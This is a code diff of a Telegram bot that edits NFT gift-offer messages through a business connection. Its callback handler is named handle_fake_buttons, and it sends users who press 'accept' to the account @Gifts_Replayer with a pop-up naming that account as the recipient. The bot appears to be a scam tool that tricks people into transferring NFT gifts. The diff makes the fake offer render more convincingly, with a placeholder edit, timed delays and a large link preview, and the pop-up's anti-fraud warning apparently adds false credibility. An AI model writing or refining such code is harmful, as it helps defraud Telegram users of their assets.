@@ -53,7 +53,6 @@ def get_pretty_name(slug):
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
 @dp.message(CommandStart())
-@dp.message(Command("menu"))
 async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
@@ -114,7 +113,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- РЕЖИМ ОТЛАДКИ ---
+# --- CACHE-BUSTER ДЛЯ МОБИЛЬНОГО TELEGRAM ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -133,43 +132,54 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
         ])
-        success_alert = "⚠️ Внимание!\n\nПолучатель в этом сервисе:\n@Gifts_Replayer.\n\nЕсли вас просят передать NFT напрямую другому пользователю — не отправляйте его."
+        alert_text = (
+            "⚠️ Внимание!\n\n"
+            "Получатель в этом сервисе:\n"
+            "@Gifts_Replayer.\n\n"
+            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
+        )
     else:
         new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
-        success_alert = None
+        alert_text = None
 
-    edit_success = False
-    error_message = ""
-
-    # Пытаемся изменить
     try:
+        # ШАГ 1: Ломаем кэш мобильного клиента (ставим пустышку)
+        await bot.edit_message_text(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            text="⏳",
+            reply_markup=None,
+            business_connection_id=business_connection_id,
+            link_preview_options=LinkPreviewOptions(is_disabled=True)
+        )
+        
+        # ШАГ 2: Ждем секунду, чтобы телефон "переварил" смену состояния
+        await asyncio.sleep(1.0)
+
+        # ШАГ 3: Отправляем финальный текст, кнопки и анимацию
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
             message_id=callback.message.message_id,
             text=new_text,
             reply_markup=new_keyboard,
             business_connection_id=business_connection_id,
-            parse_mode="HTML"
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
         )
-        edit_success = True
-    except TelegramBadRequest as e:
-        if "message is not modified" in str(e).lower():
-            edit_success = True # Считаем это успехом
-        else:
-            error_message = f"TelegramBadRequest: {e}"
-    except Exception as e:
-        error_message = f"Exception: {e}"
 
-    # Показываем окно
-    if edit_success:
-        if success_alert:
-            await callback.answer(success_alert, show_alert=True)
+        # ШАГ 4: Ждем еще полсекунды и показываем окно
+        await asyncio.sleep(0.5)
+        if alert_text:
+            await callback.answer(alert_text, show_alert=True)
         else:
             await callback.answer()
-    else:
-        # ВЫВОДИМ ОШИБКУ ПРЯМО В ОКНО
-        await callback.answer(f"ОШИБКА: {error_message}", show_alert=True)
+
+    except TelegramBadRequest as e:
+        if "message is not modified" not in str(e).lower():
+            print(f"Ошибка изменения: {e}")
+    except Exception as e:
+        print(f"Неизвестная ошибка: {e}")
 
 async def main():
     print("Бот запущен...")
